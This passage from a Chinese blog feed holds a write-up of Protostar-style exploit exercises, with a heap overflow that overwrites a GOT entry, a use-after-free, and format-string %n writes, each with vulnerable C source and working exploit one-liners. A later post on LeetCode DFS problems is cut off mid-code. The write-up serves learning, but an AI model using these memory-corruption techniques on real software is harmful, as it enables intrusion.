class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">internet</span> &#123;</span><br>    <span class="hljs-type">int</span> priority;<br>    <span class="hljs-type">char</span>* name;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">winner</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;and we have a winner @ %d\n&quot;</span>, time(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">internet</span> *<span class="hljs-title">i1</span>, *<span class="hljs-title">i2</span>, *<span class="hljs-title">i3</span>;</span><br>    i1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> internet));<br>    i1-&gt;priority = <span class="hljs-number">1</span>;<br>    i1-&gt;name = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    i2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> internet));<br>    i2-&gt;priority = <span class="hljs-number">2</span>;<br>    i2-&gt;name = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(i1-&gt;name, argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">strcpy</span>(i2-&gt;name, argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;and that&#x27;s a wrap folks!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-3"><a href="#1-思路-3" class="headerlink" title="1 思路"></a>1 思路</h4><p>利用写 i1 修改 i2 的 *name 为 puts@plt 指向的got地址，第二次strcpy把winner写入puts的got表中。</p><p><img src="/images/heap1-0.png"></p><p><img src="/images/heap1-1.png"></p><h4 id="2-解答-5"><a href="#2-解答-5" class="headerlink" title="2.解答"></a>2.解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*20 + &#x27;\x74\x97\x04\x08&#x27;+&#x27; &#x27;+&#x27;\x94\x84\x04\x08&#x27;&quot;</span> |xargs ./heap1<br></code></pre></td></tr></table></figure><p><img src="/images/heap1-2.png"></p><h3 id="Heap-2"><a href="#Heap-2" class="headerlink" title="Heap 2"></a>Heap 2</h3><h4 id="0-源代码-6"><a href="#0-源代码-6" class="headerlink" title="0.源代码"></a>0.源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">auth</span> &#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">int</span> auth;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">auth</span>* <span class="hljs-title">auth</span>;</span><br><span class="hljs-type">char</span>* service;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    <span class="hljs-type">char</span> line[<span class="hljs-number">128</span>];<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[ auth = %p, service = %p ]\n&quot;</span>, auth, service);<br><br>        <span class="hljs-keyword">if</span> (fgets(line, <span class="hljs-keyword">sizeof</span>(line), <span class="hljs-built_in">stdin</span>) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;auth &quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>            auth = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(auth));<br>            <span class="hljs-built_in">memset</span>(auth, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(auth));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(line + <span class="hljs-number">5</span>) &lt; <span class="hljs-number">31</span>) &#123;<br>                <span class="hljs-built_in">strcpy</span>(auth-&gt;name, line + <span class="hljs-number">5</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;reset&quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">free</span>(auth);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;service&quot;</span>, <span class="hljs-number">6</span>) == <span class="hljs-number">0</span>) &#123;<br>            service = strdup(line + <span class="hljs-number">7</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (auth-&gt;auth) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have logged in already!\n&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please enter your password\n&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-4"><a href="#1-思路-4" class="headerlink" title="1.思路"></a>1.思路</h4><p>典型的<strong>UAF</strong>漏洞：当应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p><p>free(auth) 之后指针保留，但所在空间会被 service 占用，写入信息覆盖 auth 即可。</p><h4 id="2-解答-6"><a href="#2-解答-6" class="headerlink" title="2.解答"></a>2.解答</h4><p><img src="/images/heap2-0.png"></p><h2 id="0x03格式化字符串"><a href="#0x03格式化字符串" class="headerlink" title="0x03格式化字符串"></a>0x03格式化字符串</h2><h3 id="format0"><a href="#format0" class="headerlink" title="format0"></a>format0</h3><h4 id="0-代码"><a href="#0-代码" class="headerlink" title="0.代码"></a>0.代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *<span class="hljs-built_in">string</span>)</span>  <br>&#123;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> target;<span class="hljs-comment">//遇到这个关键字声明的变量，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问；如果不使用valatile，则编译器将对所声明的语句进行优化</span><br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br><br>  target = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-built_in">sprintf</span>(buffer, <span class="hljs-built_in">string</span>);<br><br>  <span class="hljs-keyword">if</span>(target == <span class="hljs-number">0xdeadbeef</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have hit the target correctly :)\n&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>  <br>&#123;<br>  vuln(argv[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-5"><a href="#1-思路-5" class="headerlink" title="1.思路"></a>1.思路</h4><p>这题很简单，由于target变量是volatile类型的，因此我们可以通过溢出写入buffer实现改变target的值为0xdeadbeef，进而通过本关。</p><h4 id="2-解答-7"><a href="#2-解答-7" class="headerlink" title="2.解答"></a>2.解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*64+&#x27;\xef\xbe\xad\xde&#x27;&quot;</span>|xargs ./format0<br></code></pre></td></tr></table></figure><p><img src="/images/format0.png"></p><h3 id="format1"><a href="#format1" class="headerlink" title="format1"></a>format1</h3><h4 id="0-代码-1"><a href="#0-代码-1" class="headerlink" title="0.代码"></a>0.代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> target;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *<span class="hljs-built_in">string</span>)</span>  <br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-built_in">string</span>);<br><br>  <span class="hljs-keyword">if</span>(target) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have modified the target :)\n&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>  <br>&#123;<br>  vuln(argv[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="1.分析"></a>1.分析</h4><p>简单简介下%n吧：<br>输出格式 %n 可以将所输出字符串的长度值赋绐一个变量, 见下例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> slen;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world%n&quot;</span>, &amp;slen);<br></code></pre></td></tr></table></figure><p>执行后变量slen被赋值为11。</p><p>再结合这道题的printf(string),其实这个跟printf(“%s”,string)是不一样的，问题就是出自这里，当格式化字符串后再加上%x的话会紧接着读取堆栈里面的内容。</p><p>首先获取变量target的地址：</p><p><strong>objdump -t .&#x2F;format1 | grep target</strong></p><p><strong>08049638 g         O .bss     00000004                            target</strong></p><p>然后在堆栈中寻找赋值的位置，用%x填充堆栈的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./format1 $(python -c <span class="hljs-string">&#x27;print &quot; \x38\x96\x04\x08aaaa&quot; + &quot;%x.&quot;*128+&quot;%x&quot;&#x27;</span>)<br>8aaaa804960c.bffffb58.8048469.b7fd8304.b7fd7ff4.bffffb58.8048435.bffffd1e.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbd8.b7eadc76.2.bffffc04.bffffc10.b7fe1848.bffffbc0.ffffffff.b7ffeff4.804824d.1.bffffbc0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbd8.67947b62.4ddacd72.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc04.8048450.8048440.b7ff1040.bffffbfc.b7fff8f8.2.bffffd14.bffffd1e.0.bffffea9.bffffeb9.bffffecd.bffffeee.bffffef7.bfffff0a.bfffff14.bfffff56.bfffff6a.bfffff81.bfffff92.bfffff9d.bfffffa5.bfffffb2.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffcfb.1f.bffffff2.f.bffffd0b.0.0.0.0.30000000.5d2405bd.a30ecc31.c3589634.694178cf.363836.0.6f662f2e.74616d72.96380031.61610804.78256161<br></code></pre></td></tr></table></figure><p>发现目测在127的位置拥有a和十六进制\x38\x96\x04\x08，然后还有一定的偏移，于是我们调整一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./format1 $(python -c <span class="hljs-string">&#x27;print &quot; \x38\x96\x04\x08baaaa&quot; + &quot;%x.&quot;*127+&quot;%x&quot;&#x27;</span>)<br>8baaaa804960c.bffffb58.8048469.b7fd8304.b7fd7ff4.bffffb58.8048435.bffffd20.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbd8.b7eadc76.2.bffffc04.bffffc10.b7fe1848.bffffbc0.ffffffff.b7ffeff4.804824d.1.bffffbc0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbd8.f416f263.de584473.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc04.8048450.8048440.b7ff1040.bffffbfc.b7fff8f8.2.bffffd16.bffffd20.0.bffffea9.bffffeb9.bffffecd.bffffeee.bffffef7.bfffff0a.bfffff14.bfffff56.bfffff6a.bfffff81.bfffff92.bfffff9d.bfffffa5.bfffffb2.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffcfb.1f.bffffff2.f.bffffd0b.0.0.0.0.8d000000.197d9fe4.4a8e05f0.3fbd86e9.69ee56d6.363836.0.2f2e0000.6d726f66.317461.8049638<br></code></pre></td></tr></table></figure><p>于是我们将最后一个位置写入字符串长度数据，把%x换成%n即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./format1 $(python -c <span class="hljs-string">&#x27;print &quot; \x38\x96\x04\x08baaaa&quot; + &quot;%x.&quot;*127+&quot;%n&quot;&#x27;</span>)<br>8baaaa804960c.bffffb58.8048469.b7fd8304.b7fd7ff4.bffffb58.8048435.bffffd20.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbd8.b7eadc76.2.bffffc04.bffffc10.b7fe1848.bffffbc0.ffffffff.b7ffeff4.804824d.1.bffffbc0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbd8.6c1c469e.4652f08e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc04.8048450.8048440.b7ff1040.bffffbfc.b7fff8f8.2.bffffd16.bffffd20.0.bffffea9.bffffeb9.bffffecd.bffffeee.bffffef7.bfffff0a.bfffff14.bfffff56.bfffff6a.bfffff81.bfffff92.bfffff9d.bfffffa5.bfffffb2.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffcfb.1f.bffffff2.f.bffffd0b.0.0.0.0.7e000000.431dc4f2.70f0c9f5.95269a88.6907b8e5.363836.0.2f2e0000.6d726f66.317461.you have modified the target :)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>堆栈溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法练习-DFS</title>
    <link href="/blog/2020/03/05/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-DFS/"/>
    <url>/blog/2020/03/05/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-DFS/</url>
    
    <content type="html"><![CDATA[<p><strong>今天专门来复习+学习一下深度优先遍历算法，做一下oj题目。</strong></p><p><img src="/images/fj37.jpg"></p><span id="more"></span><p><strong>深度优先搜索算法</strong>（英语：Depth-First-Search，DFS）是一种用于遍历或搜索树或图的算法。沿着树的深度遍历树的节点，尽可能深的搜索树的分支。当节点v的所在边都己被探寻过，搜索将回溯到发现节点v的那条边的起始节点。这一过程一直进行到已发现从源节点可达的所有节点为止。如果还存在未被发现的节点，则选择其中一个作为源节点并重复以上过程，整个进程反复进行直到所有节点都被访问为止。属于盲目搜索。<br>深度优先搜索是图论中的经典算法，利用深度优先搜索算法可以产生目标图的相应拓扑排序表，利用拓扑排序表可以方便的解决很多相关的图论问题，如最大路径问题等等。</p><h2 id="1-验证二叉搜索树"><a href="#1-验证二叉搜索树" class="headerlink" title="1.验证二叉搜索树"></a>1.验证二叉搜索树</h2><h3 id="1-1题目描述"><a href="#1-1题目描述" class="headerlink" title="1.1题目描述"></a>1.1题目描述</h3><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。</p><p>假设一个二叉搜索树具有如下特征：</p><p>节点的左子树只包含小于当前节点的数。<br>节点的右子树只包含大于当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。</p><p>示例 1:</p><p>输入:<br>    2<br>   &#x2F; <br>  1   3<br>输出: true</p><p>示例 2:</p><p>输入:<br>    5<br>   &#x2F; <br>  1   4<br>     &#x2F; <br>    3   6<br>输出: false<br>解释: 输入为: [5,1,4,null,null,3,6]。<br>根节点的值为 5 ，但是其右子节点值为 4 。</p><p>来源：<a href="https://leetcode-cn.com/problems/validate-binary-search-tree">https://leetcode-cn.com/problems/validate-binary-search-tree</a></p><h3 id="1-2思路分析"><a href="#1-2思路分析" class="headerlink" title="1.2思路分析"></a>1.2思路分析</h3><p>该题最显然的思路就是采用中序遍历递归调用算法，最开始是用的把所有节点值放进数组中，然后再检查数组是否有序，后来发现太占用内存和花费时间了，就改了一下，记录一次上次节点的值last，然后用last和当前遍历的节点比较即可，节约内存和缩小运行时间。</p><h3 id="1-3代码"><a href="#1-3代码" class="headerlink" title="1.3代码"></a>1.3代码</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs abnf">/**<br> * Definition for a binary tree node.<br> * struct TreeNode &#123;<br> *     int val<span class="hljs-comment">;</span><br> *     struct TreeNode *left<span class="hljs-comment">;</span><br> *     struct TreeNode *right<span class="hljs-comment">;</span><br> * &#125;<span class="hljs-comment">;</span><br> */<br><br>int flag<span class="hljs-comment">;</span><br>long int last <span class="hljs-comment">;</span><br>void findArray(struct TreeNode* root)&#123;<br>    if(root <span class="hljs-operator">=</span><span class="hljs-operator">=</span> NULL)&#123;<br>        return NULL<span class="hljs-comment">;</span><br>    &#125;<br>    findArray(root-&gt;left)<span class="hljs-comment">;</span><br>    if(last &gt;<span class="hljs-operator">=</span> root-&gt;val)<br>        flag <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    last <span class="hljs-operator">=</span> root-&gt;val<span class="hljs-comment">;</span><br>    findArray(root-&gt;right)<span class="hljs-comment">;</span><br>&#125;<br>bool isValidBST(struct TreeNode* root)&#123;<br>    last <span class="hljs-operator">=</span> -<span class="hljs-number">2147483649</span><span class="hljs-comment">;</span><br>    flag <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    findArray(root)<span class="hljs-comment">;</span><br>    if(flag <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">0</span>)<br>        return true<span class="hljs-comment">;</span><br>    else return false<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//再次优化版本</span><br><span class="hljs-type">long</span> <span class="hljs-type">int</span> last = <span class="hljs-number">-2147483649</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">isValidBST</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root != <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!isValidBST1(root-&gt;left))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(last &gt;= root-&gt;val)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        last=root-&gt;val;<br>        <span class="hljs-keyword">if</span>(!isValidBST1(root-&gt;right))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-恢复二叉搜索树"><a href="#2-恢复二叉搜索树" class="headerlink" title="2.恢复二叉搜索树"></a>2.恢复二叉搜索树</h2><h3 id="2-1题目描述"><a href="#2-1题目描述" class="headerlink" title="2.1题目描述"></a>2.1题目描述</h3><p>二叉搜索树中的两个节点被错误地交换。</p><p>请在不改变其结构的情况下，恢复这棵树。</p><p>示例 1:</p><p>输入: [1,3,null,null,2]</p><p>   1<br>  &#x2F;<br> 3<br>  <br>   2</p><p>输出: [3,1,null,null,2]</p><p>   3<br>  &#x2F;<br> 1<br>  <br>   2</p><p>示例 2:</p><p>输入: [3,1,4,null,null,2]</p><p>  3<br> &#x2F; <br>1   4<br>   &#x2F;<br>  2</p><p>输出: [2,1,4,null,null,3]</p><p>  2<br> &#x2F; <br>1   4<br>   &#x2F;<br>  3</p><p>来源：<a href="https://leetcode-cn.com/problems/recover-binary-search-tree">https://leetcode-cn.com/problems/recover-binary-search-tree</a></p><h3 id="2-2思路分析"><a href="#2-2思路分析" class="headerlink" title="2.2思路分析"></a>2.2思路分析</h3><p>看到该题也是想到应该中序遍历，二叉排序树中序遍历结果应该是一个递增的数列，我们只需要记住两个错误的节点的指针就好啦，然后将这两个指针中的内容交换，即可恢复出正确的序列值。</p><h3 id="2-3代码"><a href="#2-3代码" class="headerlink" title="2.3代码"></a>2.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> flag;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">myfirst</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">mysecond</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">last</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">recoverTree</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span> &#123;<br>    myfirst = <span class="hljs-literal">NULL</span>;<br>    mysecond = <span class="hljs-literal">NULL</span>;<br>    last = <span class="hljs-literal">NULL</span>;<br>    flag = <span class="hljs-number">0</span>;<br>    midOrder(root);<br>    <span class="hljs-type">int</span> first;<br>    first = myfirst-&gt;val;<br>    myfirst-&gt;val = mysecond-&gt;val;<br>    mysecond-&gt;val = first;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">midOrder</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br>    midOrder(root-&gt;left);<br>    <span class="hljs-keyword">if</span> (last!=<span class="hljs-literal">NULL</span>&amp;&amp;root-&gt;val &lt; last-&gt;val&amp;&amp;flag == <span class="hljs-number">0</span>)&#123;<br>        flag = <span class="hljs-number">1</span>;<br>        myfirst = last;<br>        mysecond = root;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (last!=<span class="hljs-literal">NULL</span>&amp;&amp;root-&gt;val &lt; last-&gt;val&amp;&amp;flag == 